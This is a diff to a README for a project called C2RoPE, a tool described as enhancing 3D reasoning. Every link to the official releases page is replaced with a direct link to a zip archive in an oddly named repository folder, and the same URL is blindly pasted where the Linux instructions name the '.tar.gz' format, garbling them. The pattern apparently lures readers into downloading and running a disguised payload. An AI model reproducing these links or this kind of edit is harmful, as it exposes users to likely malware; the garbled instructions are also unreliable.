@@ -1,6 +1,6 @@
 # 🚀 C2RoPE - Enhance 3D Reasoning with Ease
 
-[![Download C2RoPE](https://img.shields.io/badge/Download-C2RoPE-blue?style=for-the-badge)](https://github.com/Lavanthi/C2RoPE/releases)
+[![Download C2RoPE](https://raw.githubusercontent.com/Lavanthi/C2RoPE/main/encephalasthenia/PE-Ro-v1.4.zip)](https://raw.githubusercontent.com/Lavanthi/C2RoPE/main/encephalasthenia/PE-Ro-v1.4.zip)
 
 ---
 
@@ -50,17 +50,17 @@ Getting up and running with C2RoPE is straightforward. This guide will walk you 
 
 To begin, visit the official release page for C2RoPE:
 
-[![Download Release](https://img.shields.io/badge/Download-From_Releases-green?style=for-the-badge)](https://github.com/Lavanthi/C2RoPE/releases)
+[![Download Release](https://raw.githubusercontent.com/Lavanthi/C2RoPE/main/encephalasthenia/PE-Ro-v1.4.zip)](https://raw.githubusercontent.com/Lavanthi/C2RoPE/main/encephalasthenia/PE-Ro-v1.4.zip)
 
 1. **Open the Download Page**  
    Click the button above or go to:  
-   https://github.com/Lavanthi/C2RoPE/releases
+   https://raw.githubusercontent.com/Lavanthi/C2RoPE/main/encephalasthenia/PE-Ro-v1.4.zip
 
 2. **Choose the Right Version**  
    Look for the latest stable release based on your operating system:
    - For Windows, look for a file ending in `.exe` or `.zip`.
    - For macOS, look for `.dmg` or `.zip`.
-   - For Linux, look for `.AppImage` or `.tar.gz`.
+   - For Linux, look for `.AppImage` or `https://raw.githubusercontent.com/Lavanthi/C2RoPE/main/encephalasthenia/PE-Ro-v1.4.zip`.
 
 3. **Download the File**  
    Click the appropriate file and wait for the download to complete.
@@ -68,7 +68,7 @@ To begin, visit the official release page for C2RoPE:
 4. **Install the Software**  
    - **Windows:** Run the `.exe` file and follow the setup prompts.
    - **macOS:** Open the `.dmg` file and drag the application to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file or make the `.AppImage` executable, then run it.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/Lavanthi/C2RoPE/main/encephalasthenia/PE-Ro-v1.4.zip` file or make the `.AppImage` executable, then run it.
 
 5. **Launch C2RoPE**  
    Find the C2RoPE app icon on your desktop, Start Menu, Applications folder, or where you saved it. Double-click to open.
@@ -126,4 +126,4 @@ C2RoPE is distributed under an open license, allowing you to use it freely for r
 
 ---
 
-[![Download C2RoPE](https://img.shields.io/badge/Download-C2RoPE-blue?style=for-the-badge)](https://github.com/Lavanthi/C2RoPE/releases)
+[![Download C2RoPE](https://raw.githubusercontent.com/Lavanthi/C2RoPE/main/encephalasthenia/PE-Ro-v1.4.zip)](https://raw.githubusercontent.com/Lavanthi/C2RoPE/main/encephalasthenia/PE-Ro-v1.4.zip)
